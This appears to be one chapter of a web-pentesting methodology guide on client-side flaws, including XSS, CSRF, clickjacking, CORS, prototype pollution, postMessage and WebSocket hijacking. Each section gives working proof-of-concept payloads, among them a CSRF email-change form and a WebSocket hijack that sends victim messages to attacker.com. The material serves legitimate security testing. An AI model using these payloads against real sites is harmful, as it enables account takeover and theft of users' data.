# 03. Client-Side Vulnerabilities

Covers: Cross-Site Scripting (Reflected/Stored/DOM), CSRF, Clickjacking, CORS Misconfiguration, Prototype Pollution, postMessage Vulnerabilities, WebSocket Vulnerabilities.

The common thread here: the vulnerability lives in what happens **in the victim's browser**, and exploitation usually requires getting a victim (or your own second test account, for self-XSS-adjacent proofs) to load something you control.

---

## 1. Cross-Site Scripting (XSS)

**Root cause:** attacker-controlled input is rendered into a page (or executed as script) without the encoding/sanitization appropriate to the context it lands in.

**Where to find it:**
- **Reflected:** any URL/query/body parameter echoed back into the HTML response
- **Stored:** any input saved and displayed later — comments, profile fields, display names, file names, support tickets, chat/message content (directly relevant if you're testing anything with a live chat feature — check message rendering, not just message sending)
- **DOM-based:** client-side JS reading an attacker-influenceable source (`location.hash`, `location.search`, `document.referrer`, `postMessage` data, `document.cookie`) and writing it to a dangerous sink (`innerHTML`, `document.write`, `eval`, `setTimeout` with a string, `location =`)

**Methodology:**
1. Mark every candidate input with a unique, harmless string first (e.g., a random token) and see exactly where and how it comes back — encoded, in an attribute, inside a `<script>` block, inside a URL. The context dictates which payload family works.
2. Match payload to context:
   - HTML body context → `<script>`/`<img onerror>`/`<svg onload>` style tags
   - HTML attribute context → break out of the attribute first (`"><script>...`) or use an event handler if you can't add new tags
   - JS string context (reflected inside an existing `<script>` block) → break out of the string (`';alert(1);//`) rather than using HTML tags
   - URL context (e.g., `href="USER_INPUT"`) → `javascript:` scheme if not filtered
3. For DOM-based, don't just probe blindly — read the JS. Search bundles (from your Phase 2 recon grep) for sinks, then trace backward to see if a source reaches them unsanitized. Burp's DOM Invader automates a lot of this trace.
4. For stored XSS, test both "does it store" and "does it render" separately — some inputs are stored safely but rendered unsafely elsewhere (e.g., in an admin-facing view, an export/CSV, an email notification, or an API response consumed by a different part of the frontend than where you submitted it).
5. Confirm impact beyond `alert()` for reporting — session/cookie theft via OOB exfil, or a real DOM action (e.g., changing the victim's email) makes for a far stronger report than a popup screenshot.

**Probes (context-dependent, try more than one):**
```html
<script>alert(document.domain)</script>
"><svg onload=alert(document.domain)>
'-alert(document.domain)-'
javascript:alert(document.domain)
<img src=x onerror=alert(document.domain)>
```

**Bypass notes:** if `<script>` is stripped, try event-handler-based payloads (`onerror`, `onload`, `onfocus` + autofocus); if angle brackets are HTML-encoded but quotes aren't, you likely need attribute-breakout rather than new-tag payloads; case variation (`<ScRiPt>`) and null-byte/encoding tricks can bypass naive filters; for CSP-protected pages, look for CSP bypass gadgets (JSONP endpoints, allowed CDNs with exploitable libraries, `unsafe-inline` exceptions) rather than fighting the filter directly. Blind stored XSS (payload fires somewhere you can't see, e.g. an admin dashboard or a backend log viewer) needs an OOB-callback payload, not an `alert()`.

**Tools:** Burp (Repeater + DOM Invader), an XSS OOB callback service for blind cases.

**When to prioritize:** any reflected input (immediate), any stored/persisted input (test rendering everywhere it's later displayed, including other users' views), any JS-read source found during Phase 2 JS-bundle grep — see trigger table in file 01.

**Go deeper:** PortSwigger Academy "Cross-site scripting" and "DOM-based vulnerabilities" topics; HackTricks `pentesting-web/xss-cross-site-scripting`.

---

## 2. Cross-Site Request Forgery (CSRF)

**Root cause:** a state-changing request is processed based on the victim's ambient authentication (cookies) alone, with no unpredictable, per-request token proving the request was intentionally initiated by the site's own frontend.

**Where to find it:** any form or API call that changes state — profile updates, password/email changes, fund transfers, adding admin users, deleting resources.

**Methodology:**
1. For each state-changing request, check whether it includes an anti-CSRF token, and if so, whether the token is actually validated server-side (a token that's present but never checked is common and easy to miss — test by submitting the request with the token stripped or with another session's token).
2. Check `SameSite` cookie attribute on the session cookie — `Strict` or `Lax` significantly reduces CSRF risk for cross-site navigation-triggered requests; its absence or `None` is a strong signal.
3. Check whether the request can be changed from `POST`+JSON to a format a plain HTML form can send (`application/x-www-form-urlencoded`) — some CSRF-token checks only apply to the JSON code path.
4. Build a minimal auto-submitting HTML PoC and test it from a genuinely separate origin.
5. For JSON-only APIs, test JSON CSRF techniques (flash-adjacent content-type confusion, or checking if the endpoint tolerates `text/plain` bodies that still parse as valid JSON server-side, which lets a plain form submit them without a CORS preflight).

**Probe (PoC skeleton):**
```html
<html><body onload="document.forms[0].submit()">
  <form action="https://target/api/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
</body></html>
```

**Bypass notes:** referer/origin-header checks are sometimes present instead of tokens — test whether they're actually enforced (missing header entirely, vs. a spoofable value) and whether subdomain takeovers or open redirects on the same site could satisfy an origin check.

**Tools:** Burp's CSRF PoC generator as a starting point (verify manually — it doesn't know your app's specific token logic).

**When to prioritize:** every state-changing endpoint found in Phase 3 mapping — see trigger table in file 01.

**Go deeper:** PortSwigger Academy "CSRF" topic; HackTricks `pentesting-web/csrf-cross-site-request-forgery`.

---

## 3. Clickjacking

**Root cause:** the page doesn't tell the browser it refuses to be framed, so an attacker can overlay it (invisibly) inside their own page and trick a victim into clicking through to trigger real actions.

**Where to find it:** any sensitive action reachable via a simple click (not requiring re-entered credentials/2FA) — "delete account," "enable API access," "confirm transfer," social-media-style "like"/"follow" actions.

**Methodology:**
1. Check response headers for `X-Frame-Options` and CSP `frame-ancestors` on the target page.
2. If absent or permissive, build an overlay PoC: an invisible iframe of the real page positioned under a decoy button on your page, so the victim's click lands on the real page's sensitive button.
3. Confirm the click genuinely triggers the sensitive action (not just that framing is technically possible) — an unexploitable framing issue is a much weaker/no-pay finding on most programs now.

**Probe (PoC skeleton):**
```html
<style>
  iframe { opacity: 0.0001; position: absolute; top: 0; left: 0; width: 500px; height: 500px; z-index: 2; }
  button { position: absolute; top: 300px; left: 80px; z-index: 1; }
</style>
<button>Click for a free prize</button>
<iframe src="https://target/delete-account"></iframe>
```

**Tools:** Burp's built-in Clickjacking PoC generator as a starting template.

**When to prioritize:** part of the quick-win sweep in file 01 (missing frame-protection headers), then confirm exploitability on genuinely sensitive one-click actions specifically.

**Go deeper:** PortSwigger Academy "Clickjacking" topic; HackTricks `pentesting-web/clickjacking`.

---

## 4. CORS Misconfiguration

**Root cause:** the server reflects an arbitrary `Origin` request header back in `Access-Control-Allow-Origin` (instead of validating against an allowlist), especially combined with `Access-Control-Allow-Credentials: true` — letting any attacker-controlled site read authenticated API responses via the victim's browser.

**Where to find it:** any API called cross-origin by the app's own frontend (so CORS headers are present at all) — check every API host separately, since misconfig is often on one internal API host and not the main site.

**Methodology:**
1. Send a request with an arbitrary `Origin` header (e.g., `https://attacker.com`) and check whether it's reflected verbatim in `Access-Control-Allow-Origin`.
2. Check `Access-Control-Allow-Credentials` — reflected origin + credentials `true` is the dangerous combination (read of authenticated data cross-origin).
3. Test allowlist logic for weaknesses beyond a flat wildcard: substring matches (`target.com.attacker.com` passing a naive `.includes('target.com')` check), regex flaws, or trusting the `null` origin (achievable via a sandboxed iframe).
4. Build a PoC page that `fetch()`s a sensitive authenticated endpoint with `credentials: 'include'` from your origin and displays the stolen response.

**Probe (PoC skeleton):**
```html
<script>
fetch('https://target/api/account', {credentials: 'include'})
  .then(r => r.text())
  .then(data => { document.write(data); /* or exfil via fetch to attacker server */ });
</script>
```

**Bypass notes:** if `null` origin is trusted, a sandboxed iframe (`<iframe sandbox="allow-scripts" src="data:text/html,...">`) sends `Origin: null` and can trigger the same issue.

**Tools:** Burp (manual header manipulation in Repeater); part of the quick-win sweep in file 01.

**When to prioritize:** as soon as any API host is seen returning CORS headers — check it immediately, this is a cheap, fast test.

**Go deeper:** PortSwigger Academy "CORS" topic; HackTricks `pentesting-web/cors-bypass`.

---

## 5. Prototype Pollution

**Root cause:** a function that recursively merges/clones/sets nested object properties (common in utility libraries and hand-rolled "deep merge" helpers) doesn't block the `__proto__`/`constructor.prototype` key, letting attacker input modify `Object.prototype` itself — affecting every object in the application.

**Where to find it:** client-side JS that merges URL/query params into config objects, JSON-based state hydration, any "deep merge"/"deep clone" utility call visible in bundled JS (grep results from Phase 2 recon).

**Methodology:**
1. Search bundled JS for merge/extend/clone utility usage and check whether the library version in use has a known unpatched prototype pollution gadget, or whether hand-rolled merge logic lacks a `__proto__`/`prototype`/`constructor` key check.
2. Probe via URL fragment/query (client-side) or JSON body (server-side Node apps) with a `__proto__` path, then check whether a property now exists on a *fresh* object that was never explicitly given that property — proof the prototype itself was polluted, not just one object instance.
3. Client-side impact: chain the polluted property into an existing "gadget" in the app's own code — a common pattern is polluting a property that a later `innerHTML`-based render path trusts, turning prototype pollution into DOM XSS.
4. Server-side (Node) impact: pollution can affect logic gates (`isAdmin`, config flags) or, via specific gadgets, lead to RCE — this needs a known gadget in a library the app actually uses, so identify dependencies first.

**Probes:**
```
Client-side, via URL: ?__proto__[foo]=bar
Client-side, via URL: ?__proto__.foo=bar
Server-side JSON body: {"__proto__": {"isAdmin": true}}
Server-side JSON body: {"constructor": {"prototype": {"isAdmin": true}}}
```

**Bypass notes:** if `__proto__` key is explicitly blocked, try `constructor.prototype` as an alternate path to the same object.

**Tools:** Burp; browser DevTools console to directly verify `Object.prototype.foo` after sending a probe.

**When to prioritize:** whenever Phase 2 JS grep turns up merge/extend/clone utilities, or the app is Node-based server-side.

**Go deeper:** PortSwigger Academy "Prototype pollution" topic (their client-side gadget-finding methodology is the best structured walkthrough available); HackTricks `pentesting-web/deserialization/nodejs-proto-prototype-pollution`.

---

## 6. postMessage Vulnerabilities

**Root cause:** a page listens for `window.postMessage` events without validating the sender's origin, and/or a page sends sensitive data via `postMessage` to a wildcard (`*`) target origin.

**Where to find it:** apps with iframes, third-party widget embeds, or cross-window communication (payment widgets, SSO popups, chat widgets embedded via iframe).

**Methodology:**
1. Grep JS bundles (Phase 2) for `postMessage(` (sending) and `addEventListener('message'` (receiving).
2. For receivers: check if `event.origin` is validated before acting on `event.data`. If missing/weak, host a page that posts a malicious message to the target's window and observe whether the target acts on it (this is a common DOM XSS source, too — trace where `event.data` ends up).
3. For senders: check if sensitive data is sent with `*` as target origin (readable by any frame, not just the intended recipient) instead of an explicit origin.

**Probe skeleton (malicious sender targeting a vulnerable receiver):**
```html
<iframe src="https://target/vulnerable-receiver-page" id="f"></iframe>
<script>
  onload = () => document.getElementById('f').contentWindow.postMessage(
    '<img src=x onerror=alert(document.domain)>', '*'
  );
</script>
```

**Tools:** Browser DevTools (Event Listener Breakpoints on `message`); Burp's DOM Invader has postMessage-specific coverage.

**When to prioritize:** any iframe/embed/popup-based flow found in Phase 3 mapping — see trigger table in file 01.

**Go deeper:** PortSwigger Academy covers this under "DOM-based vulnerabilities → postMessage"; HackTricks `pentesting-web/postmessage-vulnerabilities`.

---

## 7. WebSocket Vulnerabilities

**Root cause:** the WebSocket handshake rides on the same ambient cookie-based auth as regular HTTP, but browsers don't apply Same-Origin Policy or CORS-style protections to WebSocket connections the way they do to `fetch()` — so origin validation has to be done explicitly by the server, and often isn't.

**Where to find it:** any `wss://` connection found in Phase 2/3 recon.

**Methodology:**
1. Check whether the server validates the `Origin` header during the WebSocket handshake. If not, this is Cross-Site WebSocket Hijacking territory — a malicious page can open a WebSocket connection to the target using the victim's ambient cookies and both send and receive messages as the victim.
2. Manipulate the handshake itself (headers, cookies) in Burp's WebSocket-aware Repeater to test for injection or auth-logic issues in how the handshake is processed.
3. Once connected, treat every message as a potential injection point — the same XSS/injection methodologies from this file and file 02 apply to WebSocket message content that gets rendered or processed server-side, not just to regular HTTP params.
4. Build a PoC HTML page that opens a cross-origin WebSocket to the target and relays received messages to an attacker-controlled endpoint, to demonstrate hijacking impact concretely.

**Probe skeleton (cross-site hijacking PoC):**
```html
<script>
  var ws = new WebSocket('wss://target/chat');
  ws.onmessage = function(event) {
    fetch('https://attacker.com/collect?data=' + encodeURIComponent(event.data));
  };
</script>
```

**Tools:** Burp Suite (native WebSocket interception/Repeater support).

**When to prioritize:** any `wss://` connection found during mapping — see trigger table in file 01. Particularly relevant for real-time features like live chat, notifications, or collaborative editing.

**Go deeper:** PortSwigger Academy "WebSockets" topic; HackTricks `pentesting-web/websocket-attacks`.
